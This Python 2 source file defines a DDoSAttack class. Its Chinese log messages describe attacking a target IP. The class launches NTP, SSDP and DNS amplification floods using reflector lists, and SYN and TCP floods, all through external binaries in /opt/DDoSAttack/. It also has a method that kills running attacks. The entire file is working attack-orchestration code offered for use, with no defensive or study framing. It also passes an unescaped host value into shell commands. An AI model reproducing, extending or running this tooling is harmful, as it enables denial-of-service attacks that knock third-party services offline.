#!/usr/bin/env python
#-*- encoding: utf-8 -*-
'''
Created on 2017-07-07 11:16:15

@author: vforbox <vforbox@gmail.com>
'''

import logging
import logging.handlers
from commands import getstatusoutput

class DDoSAttack(object):
	def __init__(self, host, port, times):
		self._host = host
		self._port = port
		self._time = times
		self._logger = logging.getLogger('DDoS')
		formater = logging.Formatter('%(asctime)s [%(name)s] [%(levelname)s] [%(funcName)s] %(message)s')
		handler = logging.handlers.TimedRotatingFileHandler('logs/ddos.log', 'midnight')
		handler.setFormatter(formater)
		if not self._logger.handlers:
		    self._logger.addHandler(handler)
		self._logger.setLevel(logging.DEBUG)


		self._params = {
			'ProcessPath' :	'/opt/DDoSAttack/',
			'AmpListPath' : '/opt/DDoSAttack/AmpList/',
			'AttackMethod':	['ntp', 'ssdp', 'dns', 'syn', 'tcp']
		}

	def _ipAddrCheck(self, ip):
		''' 
			IP 地址校验是否符合 
		'''

		num = ip.split('.')
		return len(num) == 4 and len(filter(lambda x: x >= 0 and x <= 255, map(int, filter(lambda x: x.isdigit(), num)))) == 4
	        
	def stop(self):
		'''
			停止运行 pkill Ip -f
		'''

		self._logger.debug('收到停止指令，开始停止攻击目标IP [{0}] 的任务.'.format(self._host))
		(_, output) = getstatusoutput('ps aux | grep {0} | grep -c -v grep'.format(self._host))
		if output != '0':
			getstatusoutput('/usr/bin/pkill {0} -f'.format(self._host))
			(_, output) = getstatusoutput('ps aux | grep {0} | grep -c -v grep'.format(self._host))
			if output == '0':
				self._logger.debug('停止攻击目标IP [{0}] 的任务完成.'.format(self._host))
				return True
			else:
				self._logger.error('停止攻击目标IP [{0}] 的任务失败.'.format(self._host))
				return False
		else:
			self._logger.error('停止攻击目标IP [{0}] 的任务失败，任务已执行完成或没有建立该任务.'.format(self._host))
			return False

	def ntp(self, thread):
		''' 
			NTP 模式 - 123 
		'''

		if self._ipAddrCheck(self._host) == False:
			self._logger.error('目标IP [{0}] 不是有效的IPV4地址.'.format(self._host))
			return False

		command = '{0}{1} {2} {3} {4}{5}.txt {6} -1 {7}'.format(
				self._params['ProcessPath'], 
				self._params['AttackMethod'][0], 
				self._host, self._port, 
				self._params['AmpListPath'], 
				self._params['AttackMethod'][0],
				thread, self._time
			)

		self._logger.debug('开始攻击目标IP [{0}] 任务时间是 {1} 秒.'.format(self._host, self._time))
		(status, output) = getstatusoutput(command)

		if status == 0:
			self._logger.debug('攻击目标IP [{0}] 任务完成.'.format(self._host, self._time))
			return True
		else:
			self._logger.error('攻击目标IP [{0}] 任务失败或被结束.'.format(self._host))
			return False

	def ssdp(self, thread):
		''' 
			SSDP 模式 - 1900 
		'''

		if self._ipAddrCheck(self._host) == False:
			self._logger.error('目标IP [{0}] 不是有效的IPV4地址.'.format(self._host))
			return False

		command = '{0}{1} {2} {3} {4}{5}.txt {6} {7}'.format(
				self._params['ProcessPath'], 
				self._params['AttackMethod'][1], 
				self._host, self._port, 
				self._params['AmpListPath'], 
				self._params['AttackMethod'][1],
				thread, self._time
			)

		self._logger.debug('开始攻击目标IP [{0}] 任务时间是 {1} 秒.'.format(self._host, self._time))
		(status, output) = getstatusoutput(command)

		if status == 0:
			self._logger.debug('攻击目标IP [{0}] 任务完成.'.format(self._host, self._time))
			return True
		else:
			self._logger.error('攻击目标IP [{0}] 任务失败或被结束.'.format(self._host))
			return False

	def dns(self, thread):
		''' 
			DNS 模式 - 53 
		'''

		if self._ipAddrCheck(self._host) == False:
			self._logger.error('目标IP [{0}] 不是有效的IPV4地址.'.format(self._host))
			return False

		command = '{0}{1} {2} {3} {4}{5}.txt {6} {7}'.format(
				self._params['ProcessPath'], 
				self._params['AttackMethod'][2], 
				self._host, self._port, 
				self._params['AmpListPath'], 
				self._params['AttackMethod'][2],
				thread, self._time
			)

		self._logger.debug('开始攻击目标IP [{0}] 任务时间是 {1} 秒.'.format(self._host, self._time))
		(status, output) = getstatusoutput(command)

		if status == 0:
			self._logger.debug('攻击目标IP [{0}] 任务完成.'.format(self._host, self._time))
			return True
		else:
			self._logger.error('攻击目标IP [{0}] 任务失败或被结束.'.format(self._host))
			return False

	def syn(self, thread):
		''' 
			SYN 模式 - 第一次握手 
		'''

		if self._ipAddrCheck(self._host) == False:
			self._logger.error('目标IP [{0}] 不是有效的IPV4地址.'.format(self._host))
			return False

		command = '{0}{1} {2} {3} {4} -1 {5}'.format(
				self._params['ProcessPath'], 
				self._params['AttackMethod'][3], 
				self._host, self._port, 
				thread, self._time
			)

		self._logger.debug('开始攻击目标IP [{0}] 任务时间是 {1} 秒.'.format(self._host, self._time))
		(status, output) = getstatusoutput(command)

		if status == 0:
			self._logger.debug('攻击目标IP [{0}] 任务完成.'.format(self._host, self._time))
			return True
		else:
			self._logger.error('攻击目标IP [{0}] 任务失败或被结束.'.format(self._host))
			return False

	def tcp(self, thread):
		''' 
			TCP 模式 - 三次握手 
		'''

		if self._ipAddrCheck(self._host) == False:
			self._logger.error('目标IP [{0}] 不是有效的IPV4地址.'.format(self._host))
			return False

		command = '{0}{1} {2} {3} {4} -1 {5}'.format(
				self._params['ProcessPath'], 
				self._params['AttackMethod'][4], 
				self._host, self._port, 
				thread, self._time
			)

		self._logger.debug('开始攻击目标IP [{0}] 任务时间是 {1} 秒.'.format(self._host, self._time))
		(status, output) = getstatusoutput(command)

		if status == 0:
			self._logger.debug('攻击目标IP [{0}] 任务完成.'.format(self._host, self._time))
			return True
		else:
			self._logger.error('攻击目标IP [{0}] 任务失败或被结束.'.format(self._host))
			return False